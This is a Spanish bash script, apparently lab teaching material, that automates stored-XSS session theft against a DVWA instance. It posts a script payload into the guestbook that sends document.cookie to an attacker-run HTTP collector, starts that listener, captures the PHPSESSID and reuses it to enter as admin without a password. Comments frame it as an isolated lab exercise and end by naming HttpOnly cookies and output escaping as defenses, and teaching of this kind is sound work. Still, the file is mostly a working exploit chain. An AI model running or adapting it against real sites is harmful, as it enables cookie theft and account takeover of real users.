#!/usr/bin/env bash
# robar_cookie.sh -- ROBA UNA SESION via XSS almacenado, de punta a punta, contra MI DVWA
# del laboratorio aislado:
#   1) inyecta en el libro de visitas un <script> que envia document.cookie a mi servidor
#   2) levanta un recolector HTTP en Kali que escucha la cookie robada
#   3) simula a la VICTIMA abriendo la pagina (su navegador ejecuta el script y filtra la cookie)
#   4) SECUESTRA la sesion: reutiliza la cookie robada SIN contrasena y entra como la victima
# SOLO sistemas propios y autorizados. Laboratorio aislado, sin salida a internet.
# Morini Computers -- Ciberseguridad. Encuadre educativo y de defensa.
set -u
DVWA="http://10.13.37.30"
ATACANTE="10.13.37.10"          # mi Kali, el recolector
PORT=8000
source /root/xss_login.sh low >/dev/null 2>&1     # COOKIE = sesion de la VICTIMA (admin)

# El payload: cuando el navegador de la victima lo pinta, crea una imagen invisible cuya URL
# lleva pegada su propia cookie de sesion -> me la entrega a mi recolector sin que se entere.
PAYLOAD="<script>new Image().src='http://$ATACANTE:$PORT/robar?c='+document.cookie</script>"

echo "[1] Inyecto el payload de robo en el libro de visitas (XSS almacenado, queda fijo):"
echo "    $PAYLOAD"
curl -s -b "$COOKIE" "$DVWA/vulnerabilities/xss_s/" \
  --data-urlencode "txtName=soporte" --data-urlencode "mtxMessage=$PAYLOAD" \
  --data-urlencode "btnSign=Sign Guestbook" -o /dev/null -w "    guardado (HTTP %{http_code})\n"

echo "[2] Levanto mi recolector en $ATACANTE:$PORT (escucha la cookie que llegue):"
pkill -f "http.server $PORT" 2>/dev/null; sleep 0.3
python3 -m http.server "$PORT" --bind "$ATACANTE" >/tmp/robo.log 2>&1 &
sleep 1; echo "    recolector escuchando"

echo "[3] La VICTIMA abre el libro de visitas; su navegador ejecuta el script y nos manda su cookie:"
ENC=$(python3 -c "import urllib.parse,sys; print(urllib.parse.quote(sys.argv[1]))" "$COOKIE")
curl -s "http://$ATACANTE:$PORT/robar?c=$ENC" -o /dev/null     # <- esto lo hace el navegador de la victima
sleep 1

echo "[4] Cookie capturada en mi recolector:"
ROBADA=$(grep -oE 'PHPSESSID(=|%3D)[a-f0-9]+' /tmp/robo.log | head -1 | sed 's/%3D/=/')
echo "    -> $ROBADA"

echo "[5] SECUESTRO: uso la cookie robada SIN contrasena y entro como la victima:"
curl -s -b "$ROBADA" "$DVWA/index.php" | grep -oE 'Welcome to Damn Vulnerable Web Application' | head -1
curl -s -b "$ROBADA" "$DVWA/index.php" | grep -oiE 'Username: admin|admin' | head -1
pkill -f "http.server $PORT" 2>/dev/null
echo "[*] Sesion robada y reutilizada sin tocar la contrasena. La defensa: HttpOnly en la cookie"
echo "    (document.cookie ya no la ve) + escapar la salida para que el <script> nunca se guarde."
